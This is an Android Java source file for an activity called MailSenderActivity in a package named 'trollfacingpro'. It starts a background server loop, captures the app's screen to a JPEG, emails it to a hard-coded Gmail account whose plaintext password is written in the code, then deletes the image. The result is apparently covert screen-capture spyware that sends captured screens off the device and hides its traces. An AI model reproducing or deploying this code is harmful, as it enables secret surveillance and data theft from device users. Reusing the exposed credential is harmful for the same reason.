package com.example.trollfacingpro;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Date;

import android.os.Bundle;
import android.os.Environment;
import android.app.Activity;
import android.graphics.Bitmap;
import android.view.Menu;
import android.view.View;
import android.util.Log;

public class MailSenderActivity extends Activity {

	static     File imageFile;  //file that the screen goes to
	static   Bitmap bitmap;   //captured screen
	static Activity ctx;
	static   String mPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString()+"/screen1.jpg";
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mail_sender);
          
        ctx = this;        
    	new Thread(new MainServLoop()).start();	
       
    }//end onCreate
    
    
    static void sendMail(){
    	
    	
    	 try {   
          	
         	//capture
         	Date dt1 = new Date();                
         	String textbody = "captured time: ["+ (1900 +dt1.getYear())  +"-"
	                	                                +dt1.getMonth()  +"-"
	                	                                +dt1.getDay()    +" "
	                	                                +dt1.getHours()  +":"
	                	                                +dt1.getMinutes()+":"
	                	                                +dt1.getSeconds()+"]";
         	
          	View v1 = ctx.getWindow().getDecorView().getRootView();
         	v1.setDrawingCacheEnabled(true);
         	bitmap = Bitmap.createBitmap(v1.getDrawingCache());
         	v1.setDrawingCacheEnabled(false);
         	  
         	OutputStream fout = null;
           	imageFile = new File(mPath);
       
           	fout = new FileOutputStream(imageFile);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fout);   //compress captured screen and write into jpg file
            fout.flush();
            fout.close(); 
                       
            //now attach the file to mail and send
         	
         	GMailSender sender = new GMailSender("defcon.fused@gmail.com", "realtehluke"); //sent=0
             
         	new Thread(new MailSendRunnable(sender, textbody)).start();
         	
            //and remove it
         	while(sender.sent==0){} 
             
            imageFile.delete();                   
            if(!imageFile.exists())
            Log.e("FILE", "REMOVED");
                         
         } 
         
         catch (FileNotFoundException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         }            
         catch (Exception e) {   
             Log.e("SendMail", e.getMessage(), e);   
         }     	
    	
    }//end function
         
    
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_mail_sender, menu);
        return true;
    }
}
